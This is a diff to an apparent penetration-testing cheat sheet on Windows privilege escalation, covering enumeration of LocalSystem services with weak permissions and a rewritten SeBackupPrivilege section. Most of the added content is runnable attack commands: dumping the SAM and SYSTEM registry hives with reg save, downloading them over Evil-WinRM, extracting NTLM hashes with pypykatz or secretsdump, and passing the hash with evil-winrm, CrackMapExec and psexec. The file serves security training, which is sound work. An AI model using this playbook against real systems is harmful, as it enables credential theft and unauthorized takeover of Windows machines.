@@ -17,10 +17,13 @@ These services might use custom paths (e.g., C:\Users\Public\svc.exe) instead of
     $_.StartName -eq "LocalSystem" -and
     $_.PathName -notlike "C:\Windows\System32*"
     } | Select-Object Name, StartName, PathName
+
+    
 ✅ WMIC:
 cmd
 
     wmic service get name,startname,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\\Windows\\System32"
+<img width="1016" height="237" alt="image" src="https://github.com/user-attachments/assets/b58cd5a7-6d2d-4bba-b200-baa7cc66faee" />
 🔐 2. Check Permissions on Service Configuration
 Use AccessChk to determine whether a user can start, stop, configure, or modify a service.
 
@@ -35,6 +38,7 @@ SERVICE_ALL_ACCESS	Full control
 SERVICE_CHANGE_CONFIG	Can change service binary path
 WRITE_DAC / WRITE_OWNER	Can escalate to full control
 GENERIC_WRITE / GENERIC_ALL	Equivalent to full control
+<img width="939" height="407" alt="image" src="https://github.com/user-attachments/assets/e4ea7ead-9a28-4752-9e52-74c28bc09e8b" />
 
 📂 3. Identify Writable Service Executables
 ✅ Export Executable Paths:
@@ -131,8 +135,9 @@ cmd
 🧪 6. Validate Exploitability
 powershell
 
-    Get-WmiObject Win32_Service -Filter "Name='<service>'" |
-  Select-Object Name, DisplayName, StartMode, State, StartName, PathName
+    Get-WmiObject Win32_Service -Filter "Name='<service>'" |Select-Object Name, DisplayName, StartMode, State, StartName, PathName
+<img width="1064" height="161" alt="image" src="https://github.com/user-attachments/assets/6fdbbea7-d56e-4cb4-80a3-4f9016f995c8" />
+    
 🤖 7. Automated Enumeration
 ✅ SharpUp
 Use SharpUp.exe for automated privilege escalation checks.
@@ -140,6 +145,9 @@ Use SharpUp.exe for automated privilege escalation checks.
 cmd
 
     SharpUp.exe --services
+    or: SharpUp.exe audit
+ <img width="974" height="482" alt="image" src="https://github.com/user-attachments/assets/b36466e1-923a-4ddb-8188-bcfb99ac4c76" />
+   
 ✅ Summary of Exploit Steps
 Step	Description
 🔍 1	Find services running as LocalSystem with writable paths
@@ -168,38 +176,95 @@ Step	Description
 <details>
 <summary>SeBackupPrivilege</summary>
  <br> 
-This specific privilege escalation is based on the act of assigning a user the SeBackupPrivilege. It was designed to allow users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files.
+🔑 What is SeBackupPrivilege?
+SeBackupPrivilege is a special Windows permission intended for backup operations.
 
-Files like the SAM file or the SYSTEM registry file are particularly valuable to attackers. Once an attacker gains an initial foothold in the system, they can exploit this access to move up to an elevated shell. They do this by reading the SAM files and potentially cracking the passwords of high-privilege users on the system or network.
+It allows a user to bypass file ACLs and read any file on the system — even highly sensitive ones like:
 
-After connecting to the target machine using Evil-WinRM, we can check if the user we logged in has the SeBackupPrivilege. This can be done with the help of the whoami command with the /priv option. It can be observed from the image below that the user aarti has the SeBackupPrivilege.
+C:\Windows\System32\config\SAM
+
+C:\Windows\System32\config\SYSTEM
+
+Attackers can abuse this to extract password hashes and escalate privileges.
+
+🔍 Step 1: Check for SeBackupPrivilege
+After getting access (e.g., through Evil-WinRM), check assigned privileges:
+
+powershell
 
     whoami /priv
+   <img width="923" height="339" alt="image" src="https://github.com/user-attachments/assets/18ee9197-db13-4739-b7cf-69ffa64bdf96" />
 
+✅ Look for SeBackupPrivilege in the output.
 
+📁 Step 2: Dump Registry Hives
+Create a Temp Directory and Dump SAM & SYSTEM
+powershell
 
-## Exploiting Privilege on Windows
-Now, we can start the exploitation of this privilege. As we discussed earlier that this privilege allows the user to read all the files in the system, we will use this to our advantage. To begin, we will traverse to the C:\ directory and then move to create a Temp directory. We can also traverse to a directory with read and write privileges if the attacker is trying to be sneaky. Then we change the directory to Temp. Here we use our SeBackupPrivilege to read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it.
+    cd C:\
+    mkdir Temp
+    reg save hklm\sam C:\Temp\sam
+    reg save hklm\system C:\Temp\system
+ <img width="766" height="416" alt="image" src="https://github.com/user-attachments/assets/5f011469-d495-42eb-8b76-fe2af58a191e" />
+   
+📥 Step 3: Transfer Files to Kali
+Use Evil-WinRM's built-in download command:
 
-     cd c:\
-     mkdir Temp
-     reg save hklm\sam c:\Temp\sam
-     reg save hklm\system c:\Temp\system
-
-  
-
-Transferring Files to Kali Linux
-Now that the Temp directory contains the SAM and SYSTEM files, use the Evil-WinRM download command to transfer these files to your Kali Linux machine.
+powershell
 
     cd Temp
     download sam
     download system
-## Extracting Hashes with Pypykatz and Gaining Access
-Now, we can extract the hive secrets from the SAM and SYSTEM files using the pypykatz. If not present on your Kali Linux, you can download it from its GitHub[https://github.com/skelsec/pypykatz]. It is a variant of Mimikatz cooked in Python. So, we can run its registry function and then use the –sam parameter to provide the path to the SAM and SYSTEM files. As soon as the command run, we can see in the demonstration below that we have successfully extracted the NTLM hashes of the Administrator account and other users as well.
+ <img width="563" height="298" alt="image" src="https://github.com/user-attachments/assets/178f145f-cb49-4cb4-9f82-6e1e424d6658" />
+   
+🔓 Step 4: Extract Hashes on Kali
+🐍 Option 1: Using PyPyKatz
+bash
 
     pypykatz registry --sam sam system
+✅ This will output NTLM hashes like:
+<img width="1021" height="296" alt="image" src="https://github.com/user-attachments/assets/cf46c206-5e73-4c69-ba4b-3ab653fe5069" />
 
-Now, we can use the NTLM Hash of the raj user to get access to the target machine as a raj user. We again used Evil-WinRM to do this. After connecting to the target machine, we run net user to see that raj user is a part of the Administrator group. This means we have successfully elevated privilege over our initial shell as the aarti user.
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e0375cf8e440aa58a809d57edd78996::
+🧰 Option 2: Using Impacket’s secretsdump.py
+
+    cd ~/impacket
+    python3 -m venv impacket-env
+    source impacket-env/bin/activate
+    secretsdump.py -system /home/kali/system -sam /home/kali/sam LOCAL
+ <img width="1056" height="320" alt="image" src="https://github.com/user-attachments/assets/9fa97eb3-93ba-496e-9418-ecb08ed1bb24" />
+   
+🚪 Step 5: Lateral Movement / Privilege Escalation
+Use the extracted NTLM hash to pivot or escalate.
+
+🛠️ Option 1: Evil-WinRM (Pass-the-Hash)
+
+evil-winrm -i <target-ip> -u <domain\user> -H <NTLM-hash>
+Example:
+
+    evil-winrm -i 192.168.216.130 -u corp\administrator -H 5e0375cf8e440aa58a809d57edd78996
+🛠️ Option 2: CrackMapExec
+
+    crackmapexec smb <target-ip> -u Administrator -H <NTLM-hash>
+🛠️ Option 3: PsExec (from Impacket)
+
+    psexec.py Administrator@<target-ip> -hashes :<NTLM-hash>
+🧑‍💼 Bonus: Enumerate Users (Optional)
+If you need to look up domain users on a DC:
+
+powershell
+
+    Get-ADUser -Filter * | Select-Object Name, SamAccountName
+Requires ActiveDirectory module, usually available on domain controllers.
+
+🔚 Summary
+Step	Action
+1️⃣	Check if user has SeBackupPrivilege
+2️⃣	Dump SAM and SYSTEM hives using reg save
+3️⃣	Download files using evil-winrm
+4️⃣	Extract hashes with pypykatz or secretsdump.py
+5️⃣	Reuse hashes with Evil-WinRM, CrackMapExec, or PsExec for lateral movement or privilege escalation
 
  </details>
 <details>
